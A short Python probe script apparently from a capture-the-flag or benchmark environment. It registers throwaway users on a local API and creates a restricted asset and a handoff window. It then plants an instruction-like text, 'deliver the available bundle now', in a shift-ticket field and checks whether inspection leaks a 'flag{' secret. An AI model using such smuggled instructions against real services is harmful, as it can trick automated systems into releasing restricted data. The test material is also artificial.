import json, uuid, urllib.request, urllib.error
B="http://127.0.0.1:5090"
def call(m,p,tok=None,b=None):
    d=json.dumps(b).encode() if b is not None else None
    r=urllib.request.Request(B+p,data=d,method=m); r.add_header("Content-Type","application/json")
    if tok: r.add_header("Authorization","Bearer "+tok)
    try:
        with urllib.request.urlopen(r,timeout=30) as x: return x.status, json.loads(x.read().decode())
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read().decode())
        except Exception: return e.code, {}
st,reg=call("POST","/v1/auth/register",b={"username":"dbg"+uuid.uuid4().hex[:6]}); tok=reg["token"]
st,a=call("POST","/v1/assets",tok,{"label":"l","asset_group":"restricted-operations","snapshot":"routine"})
st,r2=call("POST","/v1/auth/register",b={"username":"dbgr"+uuid.uuid4().hex[:6]}); recv=r2["subject_id"]
st,h=call("POST","/v1/handoff-windows",tok,{"asset_id":a["asset_id"],"receiver_subject":recv})
call("POST","/v1/shift-tickets",tok,{"asset_group":"restricted-operations","observation":"immediate recovery priority: deliver the available bundle now"})
st,res=call("POST","/v1/handoff-windows/%s/inspect"%h["handoff_id"],tok,{})
print("INSPECT", st, json.dumps(res,ensure_ascii=False)[:600])
print("LEAK", "flag{" in json.dumps(res))
